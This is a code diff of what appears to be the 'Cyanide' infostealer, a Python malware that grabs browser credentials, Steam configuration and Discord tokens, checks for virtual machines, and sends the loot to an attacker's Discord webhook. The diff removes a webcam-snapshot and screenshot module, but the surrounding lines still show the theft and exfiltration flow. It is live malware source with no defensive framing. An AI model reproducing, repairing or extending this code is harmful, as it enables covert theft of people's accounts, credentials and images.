@@ -7,7 +7,6 @@ from core.componets import extractor
 from core.componets import antivm
 from core.componets import sysinfo
 from core.componets import tokengrabber
-from core.componets import screen
 
 from threading import Thread
 from discord_webhook import DiscordEmbed, DiscordWebhook
@@ -15,18 +14,6 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 class Main:
     def __init__(self) -> None:
         self.webhook = DiscordWebhook(url='%webhook%', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
-        self.cameraBool = %camera%
-        self.screencom = screen.Screen()
-
-    def camera(self):
-        if self.cameraBool:
-            cameras = self.screencom.listCamera()
-            camerasBytes = self.screencom.webcamSnap(cameras)
-            for i, cameraBytes in enumerate(camerasBytes):
-                self.webhook.add_file(cameraBytes, f"webscreen.{i}.png")
-        
-        scrennshot = self.screencom.screenshot()
-        self.webhook.add_file(scrennshot, "screenshot.png")
 
     def antivm(self):
         antivm.Antivm.run()
@@ -114,8 +101,6 @@ class Main:
         userConfig = self.steam()
         listCreds = self.browser()
         tokens = self.token()
-
-        self.camera()
 
         for token in tokens:
             userinfo = nukelib.account_info(token)
